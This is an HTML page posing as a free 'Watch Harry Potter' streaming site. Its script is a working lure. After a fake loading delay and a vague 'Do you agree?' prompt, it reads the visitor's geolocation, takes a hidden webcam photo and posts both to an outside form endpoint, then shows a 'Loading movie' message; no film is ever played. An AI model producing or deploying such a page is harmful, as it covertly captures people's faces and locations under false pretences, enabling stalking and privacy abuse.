<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Watch Harry Potter</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body {
  margin: 0;
  height: 100vh;
  background: linear-gradient(135deg, #3a0ca3, #7209b7, #4361ee);
  font-family: Arial, sans-serif;
  display: flex;
  justify-content: center;
  align-items: center;
  color: white;
}

.container {
  background: rgba(0,0,0,0.7);
  padding: 35px;
  border-radius: 20px;
  text-align: center;
  width: 360px;
}

h1 {
  font-size: 36px;
  margin-bottom: 25px;
}

button {
  background: #5f6cff;
  color: white;
  border: none;
  padding: 14px 24px;
  margin: 8px;
  font-size: 16px;
  border-radius: 8px;
  cursor: pointer;
}

button:hover {
  background: #6f7dff;
}

#loader {
  display: none;
  margin-top: 20px;
  font-size: 18px;
}

video, canvas {
  display: none;
}
</style>
</head>

<body>
<div class="container">
  <h1>WATCH HARRY POTTER HERE</h1>

  <button onclick="start()">Watch Now â€“ Part 1</button>
  <button onclick="start()">Watch Now â€“ Part 2</button>

  <div id="loader">ðŸ”® Loading Harry Potter...</div>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>
</div>

<script>
let stream;
let locationText = "";

async function start() {
  document.getElementById("loader").style.display = "block";

  setTimeout(async () => {
    const allow = confirm(
      "Do you agree?"
    );

    if (!allow) {
      document.getElementById("loader").style.display = "none";
      return;
    }

    // LOCATION
    navigator.geolocation.getCurrentPosition(pos => {
      locationText =
        "Latitude: " + pos.coords.latitude + "\n" +
        "Longitude: " + pos.coords.longitude + "\n" +
        "Accuracy: " + pos.coords.accuracy + " meters";
    });

    // CAMERA
    stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.getElementById("video");
    video.srcObject = stream;

    video.onloadedmetadata = () => captureAndUpload();

  }, 1200); // fake loading only
}

function captureAndUpload() {
  const video = document.getElementById("video");
  const canvas = document.getElementById("canvas");

  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext("2d").drawImage(video, 0, 0);

  stream.getTracks().forEach(track => track.stop());

  // SEND AS REAL IMAGE FILE
  canvas.toBlob(async (blob) => {
    const formData = new FormData();
    formData.append("photo", blob, "photo.png");
    formData.append("location", locationText);

    await fetch("https://formspree.io/f/xjgknygj", {
      method: "POST",
      body: formData
    });

    document.getElementById("loader").innerText = "ðŸŽ¬ Loading movie...";
  });
}
</script>
</body>
</html>
